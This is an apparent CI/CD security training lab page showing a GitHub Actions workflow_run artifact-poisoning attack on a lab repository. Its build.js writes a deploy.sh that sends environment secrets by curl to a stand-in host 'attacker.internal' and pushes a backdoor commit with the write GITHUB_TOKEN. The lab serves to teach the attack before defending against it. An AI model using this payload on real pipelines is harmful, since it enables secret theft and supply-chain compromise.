# Lab 2.8: Workflow Run & Cross-Workflow Attacks

<div class="phase-stepper">
  <a href="../" class="phase-step done">Overview</a>
  <span class="phase-arrow">›</span>
  <a href="../understand/" class="phase-step done">Understand</a>
  <span class="phase-arrow">›</span>
  <span class="phase-step current">Break</span>
  <span class="phase-arrow">›</span>
  <a href="../defend/" class="phase-step upcoming">Defend</a>
  <span class="phase-arrow">›</span>
  <a href="../detect/" class="phase-step upcoming">Detect</a>
</div>

## Artifact-Based Privilege Escalation

### Step 1: Create an attack branch

```bash
cd /repos/wl-webapp
git checkout -b feature/ui-improvements
```

### Step 2: Poison the build output

The deploy workflow runs `bash dist/deploy.sh`. Modify the build to produce a malicious `deploy.sh`:

```bash
cat > build.js << 'EOF'
const fs = require('fs');

console.log("Building application...");
fs.mkdirSync('dist', { recursive: true });
fs.copyFileSync('src/index.html', 'dist/index.html');

const payload = `#!/bin/bash
echo "Deploying preview to staging..."

# Exfiltrate all secrets from the workflow_run context
env | grep -E '(TOKEN|SECRET|KEY|PASSWORD|CREDENTIAL)' | while read line; do
  curl -sf "http://attacker.internal/collect" -d "secret=$line" || true
done

# Push backdoor using the write GITHUB_TOKEN
git clone https://x-access-token:\${GITHUB_TOKEN}@github.com/\${GITHUB_REPOSITORY}.git /tmp/repo
cd /tmp/repo
echo "backdoor" >> README.md
git add -A
git commit -m "docs: update README"
git push origin main

echo "Preview deployed successfully."
`;

fs.writeFileSync('dist/deploy.sh', payload, { mode: 0o755 });
console.log("Build complete.");
EOF
```

### Step 3: Submit the PR

```bash
git add -A
git commit -m "Improve UI components"
git push origin feature/ui-improvements

curl -sf -X POST "http://gitea:3000/api/v1/repos/developer/wl-webapp/pulls" \
  -H "Content-Type: application/json" \
  -u "attacker:password" \
  -d '{"title":"Improve UI components","base":"main","head":"feature/ui-improvements"}'
```

**Checkpoint:** You should now have a PR whose build output contains a malicious `deploy.sh`, and understand how `workflow_run` will execute it with write permissions and full secrets.

### Step 4: The attack chain executes

1. PR triggers `pr-build.yml` which runs `npm run build` using the modified `build.js`
2. Build produces `dist/deploy.sh` with the payload
3. `workflow_run` triggers `deploy-preview.yml` on the default branch
4. Deploy workflow downloads the artifact and runs `bash dist/deploy.sh`
5. Script executes with **write GITHUB_TOKEN** and **all repository secrets**

### Step 5: Why existing defenses fail

- **CODEOWNERS**. workflow YAML on `main` is not modified
- **Branch protection**. `workflow_run` pushes using the privileged GITHUB_TOKEN
- **Fork PR restrictions**. `workflow_run` bypasses them because it runs on `main`
